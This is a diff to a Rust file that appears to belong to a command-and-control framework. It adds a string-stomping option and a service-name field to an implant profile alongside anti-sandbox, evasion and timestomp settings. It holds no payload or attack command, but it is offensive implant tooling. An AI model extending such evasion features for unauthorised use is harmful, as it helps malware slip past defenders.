+++ c2/src/profiles.rs
@@ -4,7 +4,7 @@ use std::{
 };
 
 use serde::Deserialize;
-use shared::tasks::{Exports, NewAgentStaging, StageType, WyrmResult};
+use shared::tasks::{Exports, NewAgentStaging, StageType, StringStomp, WyrmResult};
 use tokio::io;
 
 #[derive(Deserialize, Debug, Default, Clone)]
@@ -33,9 +33,11 @@ pub struct Network {
 pub struct Implant {
     pub anti_sandbox: Option<AntiSandbox>,
     pub debug: Option<bool>,
+    svc_name: String,
     pub network: Network,
     pub evasion: Evasion,
     pub exports: Exports,
+    pub string_stomp: Option<StringStomp>,
 }
 
 #[derive(Deserialize, Debug, Default, Clone)]
@@ -126,6 +128,8 @@ impl Profile {
             return WyrmResult::Err(String::from("At least 1 URI is required for the server."));
         }
 
+        let string_stomp = StringStomp::from(&implant.string_stomp);
+
         WyrmResult::Ok(NewAgentStaging {
             // TODO not required
             implant_name: String::new(),
@@ -146,6 +150,8 @@ impl Profile {
             jitter: implant.network.jitter,
             timestomp: implant.evasion.timestomp.clone(),
             exports: implant.exports.clone(),
+            svc_name: implant.svc_name.clone(),
+            string_stomp,
         })
     }
 }